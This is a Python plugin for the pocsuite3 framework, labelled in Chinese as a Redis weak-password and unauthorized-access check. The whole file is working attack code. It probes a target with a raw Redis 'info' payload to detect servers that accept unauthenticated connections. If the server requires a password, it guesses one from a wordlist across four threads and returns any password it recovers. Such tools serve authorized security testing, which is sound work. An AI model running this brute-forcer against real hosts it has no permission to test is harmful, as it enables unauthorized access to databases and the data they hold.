#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @File : redis_burst.py
# @Author : Norah C.IV
# @Time : 2022/4/25 10:35
# @Software: PyCharm
import redis
import itertools
import queue
import socket

from pocsuite3.api import POCBase, Output, register_poc, logger, POC_CATEGORY, VUL_TYPE
from pocsuite3.lib.core.data import paths
from pocsuite3.lib.core.threads import run_threads

task_queue = queue.Queue()
result_queue = queue.Queue()


class DemoPOC(POCBase):
    vulID = '3'
    version = '1'
    author = ['Norah C.IV']
    vulDate = '2022-04-25'
    createDate = '2022-04-25'
    updateDate = '2022-04-25'
    references = ['']
    name = 'Redis 弱密码(未授权访问)'
    appPowerLink = ''
    appName = 'redis'
    appVersion = 'All'
    vulType = VUL_TYPE.WEAK_PASSWORD
    desc = '''redis 存在弱密码(未授权访问)，可导致攻击者进行恶意操作'''
    samples = ['']
    category = POC_CATEGORY.TOOLS.CRACK
    protocol = POC_CATEGORY.PROTOCOL.REDIS

    def _verify(self):
        result = {}
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 6379

        redis_burst(host, port)
        if not result_queue.empty():
            username, password = result_queue.get()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Username'] = username
            result['VerifyInfo']['Password'] = password
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')

        return output


def get_word_list():
    username = ['']
    with open(paths.REDIS_PASS) as password:
        return itertools.product(username, password)


def port_check(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect_ex((host, int(port)))
    if connect == 0:
        return True
    else:
        s.close()
        return False


def unauthorized_access(host, port):
    ret = False
    try:
        s = socket.socket()
        payload = "\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a"
        socket.setdefaulttimeout(10)

        s.connect((host, int(port)))
        s.sendall(payload.encode())
        recv = s.recv(1024).decode()

        if recv and 'redis_version' in recv:
            ret = True
            s.close()
    except Exception:
        pass
    return ret


def redis_login(host, port, password=None):
    ret = False
    redis_db = redis.StrictRedis(host=host, port=port, db=0, password=password)
    try:
        redis_db.info()
        ret = True
    except Exception:
        pass
    return ret


def task_init(host, port):
    for username, password in get_word_list():
        task_queue.put((host, port, username.strip(), password.strip()))


def task_thread():
    while not task_queue.empty():
        host, port, username, password = task_queue.get()
        # logger.info('try burst {}:{} use username:{} password:{}'.format(
        #     host, port, username, password))
        if redis_login(host, port, password):
            with task_queue.mutex:
                task_queue.queue.clear()
            result_queue.put(('<empty>', password))


def redis_burst(host, port):
    if not port_check(host, port):
        logger.warning("{}:{} is unreachable".format(host, port))
        return

    if unauthorized_access(host, port):
        result_queue.put(('<empty>', '<empty>'))
        return

    try:
        task_init(host, port)
        run_threads(4, task_thread)
    except Exception:
        pass


register_poc(DemoPOC)
